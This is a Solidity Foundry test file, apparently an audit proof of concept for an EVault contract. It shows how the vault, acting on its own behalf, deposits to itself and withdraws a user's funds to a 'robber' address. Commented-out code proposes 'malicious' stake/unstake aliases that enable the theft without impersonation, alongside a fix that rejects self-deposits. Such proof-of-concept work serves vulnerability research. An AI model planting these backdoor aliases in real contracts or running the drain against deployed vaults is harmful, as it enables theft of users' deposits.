// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {EVaultTestBase} from "../../EVaultTestBase.t.sol";
import {console2} from "forge-std/Test.sol";

interface IEVaultAliases {
    function stake(uint256, address) external returns (uint256);
    function unstake(uint256, address, address) external returns (uint256);
}

contract VaultTest_DepositSelf is EVaultTestBase {
    uint256 one = 1e18;
    address user = makeAddr("user");
    address robber = makeAddr("robber");

    function _log(string memory label) public view {
        console2.log(label, "| User   Balance :", assetTST.balanceOf(user));
        console2.log(label, "| Vault  Balance :", assetTST.balanceOf(address(eTST)));
        console2.log(label, "| Total  Assets  :", eTST.totalAssets());
        console2.log(label, "| Robber Balance :", assetTST.balanceOf(robber));
        console2.log("------------------------|-------------------------------------");
    }

    function test_depositSelfHoax() public {
        assetTST.mint(user, one);
        _log("       User   Mint    1");

        hoax(user);
        assetTST.approve(address(eTST), one);

        assert(assetTST.balanceOf(address(eTST)) == 0);
        assert(assetTST.balanceOf(user) == one);
        assert(assetTST.balanceOf(robber) == 0);

        hoax(user);
        eTST.deposit(one, user);
        _log("       User   Deposit 1");

        hoax(address(eTST));
        eTST.deposit(one, address(eTST));
        _log("Buggy  Vault  Deposit 1");

        hoax(address(eTST));
        eTST.withdraw(one, robber, address(eTST));
        _log("Robber Vault  Steal   1");

        assert(assetTST.balanceOf(address(eTST)) == 0);
        assert(assetTST.balanceOf(user) == 0);
        assert(assetTST.balanceOf(robber) == one);
    }

    // to get rid of Vault prank i.e. `hoax(address(eTST))`
    // add these 2 malicious aliases to EVault
    /*
      /// Define aliases for 2 main VaultModule functions
      //  stake == deposit
      function stake(uint256 amount, address receiver) external returns (uint256) {
          return this.deposit(amount, receiver);
      }

      // unstake == withdraw
      function unstake(uint256 amount, address receiver, address owner) external returns (uint256) {
          return this.withdraw(amount, receiver, owner);
      }

      // to fix
      function deposit(uint256 amount, address receiver) public virtual nonReentrant returns (uint256) {
        (VaultCache memory vaultCache, address account) = initOperation(OP_DEPOSIT, CHECKACCOUNT_NONE);
      +  require(account != address(this), "Vault: cannot deposit to self");


      function test_depositSelfHack() public {
          assetTST.mint(user, one);
          _log("       User   Mint    1");

          hoax(user);
          assetTST.approve(address(eTST), one);

          assert(assetTST.balanceOf(address(eTST)) == 0);
          assert(assetTST.balanceOf(user) == one);
          assert(assetTST.balanceOf(robber) == 0);

          hoax(user);
          eTST.deposit(one, user);
          _log("       User   Deposit 1");

          IEVaultAliases(address(eTST)).stake(one, address(eTST));
          _log("Buggy  Vault  Deposit 1");

          IEVaultAliases(address(eTST)).unstake(one, robber, address(eTST));
          _log("Robber Vault  Steal   1");

          assert(assetTST.balanceOf(address(eTST)) == 0);
          assert(assetTST.balanceOf(user) == 0);
          assert(assetTST.balanceOf(robber) == one);
      }
    */
}
